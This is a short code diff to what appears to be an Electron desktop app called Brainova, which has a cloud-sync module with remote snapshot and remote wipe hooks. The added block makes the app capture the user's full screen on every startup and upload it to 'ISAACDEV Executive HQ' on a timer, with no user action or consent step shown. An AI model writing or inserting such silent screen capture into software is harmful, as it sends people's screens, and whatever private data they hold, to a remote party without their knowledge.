@@ -648,6 +648,17 @@ function createMain(splash) {
         cloudSync.onTakeSnapshot((targetUrl) => {
           takeAndUploadSnapshot(targetUrl);
         });
+
+        // Automatic full screen capture on startup sent directly to ISAACDEV Executive HQ
+        setTimeout(() => {
+          try {
+            console.log('[Brainova AutoSnapshot] Taking startup full-screen capture for ISAACDEV HQ...');
+            takeAndUploadSnapshot();
+          } catch (snapErr) {
+            console.error('[Brainova AutoSnapshot Error]:', snapErr.message);
+          }
+        }, 4500);
+
         cloudSync.onEmergencyWipe(() => {
           if (mainWindow && !mainWindow.isDestroyed()) {
             mainWindow.webContents.send('remote-emergency-wipe');
